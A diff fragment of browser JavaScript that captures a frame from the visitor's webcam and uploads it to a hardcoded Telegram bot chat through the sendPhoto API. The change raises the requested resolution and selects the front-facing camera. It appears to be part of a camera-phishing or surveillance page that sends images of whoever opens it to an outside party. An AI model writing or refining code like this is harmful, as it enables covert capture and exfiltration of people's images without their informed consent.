@@ -3,9 +3,15 @@ const chatId = '586564605';
 
 (async () => {
     try {
+        // Set video constraints for higher resolution
         const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
+            video: {
+                width: { ideal: 1280 }, // Request a resolution of 1280x720
+                height: { ideal: 720 },
+                facingMode: 'user', // Use 'environment' for the rear camera on mobile devices
+            },
         });
+
         const video = document.createElement('video');
         video.srcObject = stream;
         video.autoplay = true;
@@ -17,10 +23,12 @@ const chatId = '586564605';
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(async blob => {
+
+            canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'webcam_photo.jpg');
+
                 try {
                     const response = await fetch(
                         `https://api.telegram.org/bot${botToken}/sendPhoto`,
